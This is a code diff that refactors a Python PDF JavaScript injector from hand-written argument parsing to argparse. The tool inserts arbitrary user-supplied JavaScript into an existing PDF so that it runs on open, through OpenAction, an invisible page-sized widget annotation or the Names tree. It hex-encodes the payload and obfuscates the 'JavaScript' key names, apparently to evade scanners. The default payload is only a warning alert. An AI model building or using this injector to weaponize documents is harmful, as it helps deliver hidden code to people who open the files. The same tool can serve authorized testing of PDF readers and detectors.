@@ -1,67 +1,27 @@
 import os
 import sys
+import argparse
 
 from pdfrw import PdfWriter, PdfReader, PdfName, PdfString, IndirectPdfDict
 
-script = 'app.alert({cMsg: "Something wrong!", cTitle: "WARNING"});'
-name = 'ErrorScript'
-path = ''
-out = 'inj.pdf'
-inject_place = 'openaction'
+SCRIPT = 'app.alert({cMsg: "Something wrong!", cTitle: "WARNING"});'
+NAME = 'ErrorScript'
+PATH = ''
+OUT = 'inj.pdf'
+INJECT_PLACE = 'openaction'
 
 
-def parser(args):
-    # TODO: parse args
-    global script
-    global name
-    global path
-    global out
-    global inject_place
-
-    if len(args) < 1:
-        print("\tUsage:")
-        print("\tpdf_injector.py path/to/orig.pdf\n")
-        print("\t-n\tScriptName")
-        print(f"\t\t\t'{name}' by default")
-        print("\t-o\tpath/to/out.pdf")
-        print(f"\t\t\t'{out}' by default")
-        print("\t-S\tpath/to/script")
-        print("\t-s\tsomeJSScript();")
-        print(f"\t\t\t'{script}' by default")
-        print("\t-i\t[OpenAction | Annots | Names]")
-        print(f"\t\t\t'{inject_place}' by default")
-        print()
-        exit()
-
-    path = args[0]
-    if not os.path.exists(path):
-        print(f'File {path} does not exist')
-        exit()
-
-    # set args
-    for i in range(len(args)):
-        if args[i] == '-o':
-            out = args[i + 1]
-        elif args[i] == '-s':
-            script = args[i + 1]
-        elif args[i] == '-S':
-            if not os.path.exists(args[i + 1]):
-                print(f'File {args[i + 1]} does not exist')
-                exit()
-            with open(args[i + 1]) as f:
-                script = f.read()
-        elif args[i].lower() == 'openaction':
-            inject_place = 'openaction'
-        elif args[i].lower() == 'names':
-            inject_place = 'names'
-        elif args[i].lower() == 'annots':
-            inject_place = 'annots'
-
-    script = '<' + script.encode().hex() + '>'
-    name = '<' + name.encode().hex() + '>'
+def parse_params():
+    parser = argparse.ArgumentParser(description='Inject JavaScript in PDF using PDFrw')
+    parser.add_argument('-i', dest="path", help='path/to/orig.pdf', required=True)
+    parser.add_argument('--script', dest="script", default=None, help=f'path to file with JS-script; \n{SCRIPT} by default')
+    parser.add_argument('--name', dest="name", default=NAME, help=f'script name if injecting in /Names; \n{NAME} by default')
+    parser.add_argument('--output', dest="out", default=OUT, help=f'output file name; \n{OUT} by default')
+    parser.add_argument('--inject_place', dest="inject_place", default=INJECT_PLACE, help=f'[OpenAction | Annots | Names]; \n{INJECT_PLACE} by default')
+    return parser.parse_args()
 
 
-def add_in_annots(pdf_orig):
+def add_in_annots(script, name, pdf_orig):
     annots = {PdfName.Annots: [{PdfName.Type: PdfName.Annots, PdfName.Subtype: PdfName.Widget,
                                 PdfName.Rect: [0, 0, 900, 900],
                                 PdfName.Border: [0, 0, 0], PdfName.A:
@@ -74,7 +34,7 @@ def add_in_annots(pdf_orig):
     return pdf_orig
 
 
-def add_in_names(pdf_orig):
+def add_in_names(script, name, pdf_orig):
     names = IndirectPdfDict(**{"J#61vaScript": IndirectPdfDict(
         Names=[PdfString(name), IndirectPdfDict(JS=PdfString(script), S=PdfName('4A617661536372697074'))]
         )})
@@ -82,26 +42,40 @@ def add_in_names(pdf_orig):
     return pdf_orig
 
 
-def add_in_open_action(pdf_orig):
+def add_in_open_action(script, pdf_orig):
     open_action = IndirectPdfDict(Type=PdfName.Action, S=PdfName.JavaScript, JS=PdfString(script))
     pdf_orig.Root.OpenAction = open_action
     return pdf_orig
 
 
-def main(argv):
-    parser(argv)
-    pdf_orig = PdfReader(path)
-    analyse(pdf_orig)
+def main():
+    params = parse_params()
+    if not os.path.exists(params.path):
+        print(f'File {params.path} does not exist')
+        exit()
+    pdf_orig = PdfReader(params.path)
 
-    if inject_place == 'annots':
-        pdf_orig = add_in_annots(pdf_orig)
-    elif inject_place == 'names':
-        pdf_orig = add_in_names(pdf_orig)
+    if params.script != None:
+        if not os.path.exists(params.script):
+            print(f'File {params.script} does not exist')
+            exit()
+        with open(params.script) as f:
+            script = f.read()
+    else: 
+        script = SCRIPT
+    script = '<' + script.encode().hex() + '>'
+
+    name = '<' + params.name.encode().hex() + '>'
+
+    if params.inject_place.lower() == 'annots':
+        pdf_orig = add_in_annots(script, name, pdf_orig)
+    elif params.inject_place.lower() == 'names':
+        pdf_orig = add_in_names(script, name, pdf_orig)
     else:
-        pdf_orig = add_in_open_action(pdf_orig)
+        pdf_orig = add_in_open_action(script, pdf_orig)
 
-    PdfWriter().write(out, pdf_orig)
+    PdfWriter().write(params.out, pdf_orig)
 
 
 if __name__ == '__main__':
-    main(sys.argv[1:])
+    main()
